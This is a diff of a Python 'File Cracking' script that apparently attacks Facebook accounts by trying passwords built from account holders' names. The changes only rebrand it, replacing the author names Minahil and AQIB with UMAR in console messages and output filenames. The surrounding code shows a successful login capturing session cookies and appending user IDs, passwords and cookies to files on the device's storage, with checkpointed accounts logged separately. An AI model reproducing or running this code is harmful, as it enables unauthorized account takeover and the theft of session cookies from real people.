@@ -114,7 +114,7 @@ class Main:
 			self.menu()
 	def menu(self):
 		logo()
-		p(' [•] This Script is Free Open-Souce by Minahil  ')
+		p(' [•] This Script is Free Open-Souce by UMAR  ')
 		line()
 		p(' [1] File Cracking ')
 		p(" [2] Join Dilute Coders Facebook Group ")
@@ -195,7 +195,7 @@ class Main:
 	def method1(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [AQIB] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -243,15 +243,15 @@ class Main:
 				if "session_key" in q:
 					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 					cookie = f"sb={sb};{coki}"
-					p('\r\033[1;92m[AQIB-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/AQIB_M1_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/AQIB_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+					open('/sdcard/UMAR_M1_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[AQIB-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/AQIB_M1_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M1_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
